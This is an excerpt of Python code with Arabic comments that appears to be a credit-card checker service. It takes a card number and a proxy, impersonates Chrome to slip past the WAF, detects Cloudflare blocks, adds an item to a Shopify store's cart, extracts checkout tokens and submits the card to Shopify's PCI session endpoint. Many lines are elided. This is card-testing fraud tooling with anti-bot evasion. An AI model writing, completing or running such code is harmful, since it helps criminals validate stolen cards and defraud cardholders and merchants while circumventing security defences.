...
async def fetch_product_beast(session, store_url):
    """محرك المنتجات الكاسح بـ 4 طبقات للوصول للمنتج المتاح"""
    ...
    # الطبقة 4: الهجوم العكسي للـ HTML
    try:
...
async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    try:
        ...
        # استخراج الـ IP لمعرفة من الذي تم حظره (السيرفر أم البروكسي)
        used_ip_info = proxy.split(':')[0] if proxy else "Server IP"
        ...
        # استخدام متصفح Chrome النقي (لا نتدخل في الهيدرز أبداً لنخدع WAF)
        async with AsyncSession(impersonate="chrome120", proxies=proxies, verify=False, timeout=60) as session:
            
            # 1. سحب المنتج
            variant_id, price = await fetch_product_beast(session, store_url)
            if not variant_id: return JSONResponse(content=safe_response("Store Empty or Fully Blocked", "-"))

            # 2. الإضافة للسلة بطريقة طبيعية
            ...
            if add_res.status_code not in [200, 201]: 
                return JSONResponse(content=safe_response(f"Cart Blocked ({used_ip_info})", price))

            await asyncio.sleep(0.5)

            # 3. محاكاة ضغطة زر الدفع (POST request هو المفتاح لتوليد التوكن في المواقع الحديثة)
            ...
            # كشف هوية الحظر (لكي لا نخمن بعد الآن)
            if chk_res.status_code in [403, 429] or "cloudflare" in html_chk.lower() or "just a moment" in html_chk.lower():
                return JSONResponse(content=safe_response(f"Cloudflare Blocked ({used_ip_info})", price))
            ...
            if "/cart" in final_url and "/checkout" not in final_url:
                return JSONResponse(content=safe_response("Item Removed / Redirected to Cart", price))

            # 4. الرادار العميق لاستخراج التوكن (Deep Extraction)
            is_graphql = False
            session_token, classic_token, checkout_token = None, None, None

            # استخراج checkout_token
            ct_match = re.search(r'/checkouts/(?:c|cn|unstable|c/graphql)/([^/?]+)', final_url)
            if ct_match: checkout_token = ct_match.group(1)

            # استخراج Session Token من أي مكان في الصفحة
            ...
            if not is_graphql and not classic_token:
                ...
                return JSONResponse(content=safe_response(f"Token Hidden ({pt[:15]})", price))

            # 5. تشفير البطاقة (استخدام خوادم PCI المتعددة)
            ...
            if res_pci.status_code != 200:
                res_pci = await session.post("https://deposit.us.shopifycs.com/sessions", json={"credit_card": {"number": cc_num, "month": mm, "year": yy, "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers)

            if res_pci.status_code != 200: return JSONResponse(content=safe_response(f"Stripe PCI Blocked ({used_ip_info})", price))
            card_session_id = res_pci.json().get("id")
            if not card_session_id: return JSONResponse(content=safe_response("Card Session ID Failed", price))

            # =================================================================
            # المسار الأول: GraphQL (Shopify Checkout Extensibility)
            # =================================================================
            if is_graphql and session_token:
                ...
                if not queue_token: return JSONResponse(content=safe_response("GraphQL Proposal Rejected", price))
